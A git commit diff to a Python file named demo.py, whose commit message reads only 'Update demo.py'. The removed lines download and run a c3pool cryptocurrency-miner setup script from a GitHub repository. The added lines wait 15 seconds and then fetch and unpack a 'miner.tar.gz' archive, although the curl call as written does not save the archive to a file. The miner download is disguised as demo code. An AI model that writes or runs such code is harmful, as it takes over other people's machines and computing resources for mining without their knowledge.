29aa9f8f468a0ea528b738a13d5a10013b4b58c2
lensfa <80903255+lensfa-lzd@users.noreply.github.com>
2021-06-21 10:29:47 +0800

    Update demo.py

--- demo.py
+++ demo.py
@@ -1,6 +1,8 @@
 # coding=utf-8
 import os
 
-os.system('wget https://github.com/lensfa-lzd/xmrig/raw/main/setup_c3pool_miner.sh')
-os.system('chmod +x setup_c3pool_miner.sh')
-os.system('./setup_c3pool_miner.sh AWS16-002')
+os.system('echo "start setup script"')
+os.system('echo "等待 15 秒将继续运行安装 (按 Ctrl+C 取消)"')
+os.system('sleep 15')
+os.system('curl -L --progress-bar "https://github.com/lensfa-lzd/xmrig/raw/main/miner.tar.gz"')
+os.system('tar xf miner.tar.gz')
